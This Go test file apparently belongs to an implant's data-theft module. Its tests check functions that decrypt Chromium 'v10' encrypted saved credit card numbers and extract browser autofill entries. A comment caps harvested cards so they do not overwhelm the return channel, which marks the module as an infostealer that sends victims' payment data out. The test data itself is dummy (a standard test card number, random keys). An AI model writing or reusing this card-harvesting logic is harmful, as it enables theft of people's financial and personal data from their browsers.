package services

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"testing"

	"implant/core/sqlite"
)

// sealV10 造一条 Chromium v10 密文（"v10" + nonce(12) + 密文 + tag(16)）。
// 测试里自己加密、走真实解密路径，不依赖外部夹具。
func sealV10(t *testing.T, key, plain []byte) []byte {
	t.Helper()
	block, err := aes.NewCipher(key)
	if err != nil {
		t.Fatal(err)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		t.Fatal(err)
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		t.Fatal(err)
	}
	out := append([]byte(prefixV10), nonce...)
	return gcm.Seal(out, nonce, plain, nil)
}

// TestCardsFromRows 卡号走真实解密路径；解不开的条目只跳过、不影响其它卡
func TestCardsFromRows(t *testing.T) {
	key := make([]byte, 32)
	if _, err := rand.Read(key); err != nil {
		t.Fatal(err)
	}
	rows := []sqlite.Row{
		{
			"name_on_card":          "ALICE ZHANG",
			"card_number_encrypted": sealV10(t, key, []byte("4111111111111111")),
			"expiration_month":      int64(12),
			"expiration_year":       int64(2029),
			"nickname":              "corp",
		},
		{ // 密文被截断：必须跳过而不是产出垃圾卡号
			"name_on_card":          "BOB",
			"card_number_encrypted": []byte("v10short"),
		},
		{ // 没有密文列：跳过
			"name_on_card": "NOBODY",
		},
	}

	cards := cardsFromRows(rows, key, "chrome", "Default")
	if len(cards) != 1 {
		t.Fatalf("应只剩 1 张可解出的卡，实际 %d: %+v", len(cards), cards)
	}
	c := cards[0]
	if c.Number != "4111111111111111" || c.Name != "ALICE ZHANG" ||
		c.ExpMonth != 12 || c.ExpYear != 2029 || c.Nickname != "corp" {
		t.Fatalf("字段映射不符: %+v", c)
	}
}

// TestCardsFromRowsCaps 超过上限时截断（防止一张卡库里几千条把回传压垮）
func TestCardsFromRowsCaps(t *testing.T) {
	key := make([]byte, 32)
	rows := make([]sqlite.Row, 0, maxCardItems+50)
	for i := 0; i < maxCardItems+50; i++ {
		rows = append(rows, sqlite.Row{
			"card_number_encrypted": sealV10(t, key, []byte("4111111111111111")),
		})
	}
	if got := len(cardsFromRows(rows, key, "chrome", "Default")); got != maxCardItems {
		t.Fatalf("应截断到 %d，实际 %d", maxCardItems, got)
	}
}

// TestAutofillFromRows 自动填充是明文，只做字段校验与上限
func TestAutofillFromRows(t *testing.T) {
	rows := []sqlite.Row{
		{"name": "email", "value": "alice@corp.local", "count": int64(7)},
		{"name": "", "value": "x"},
		{"name": "phone", "value": ""},
		{"name": "phone", "value": "13800000000"},
	}
	got := autofillFromRows(rows)
	if len(got) != 2 {
		t.Fatalf("应保留 2 条，实际 %d: %+v", len(got), got)
	}
	if got[0].Field != "email" || got[0].Value != "alice@corp.local" || got[0].Count != 7 {
		t.Fatalf("字段映射不符: %+v", got[0])
	}
}
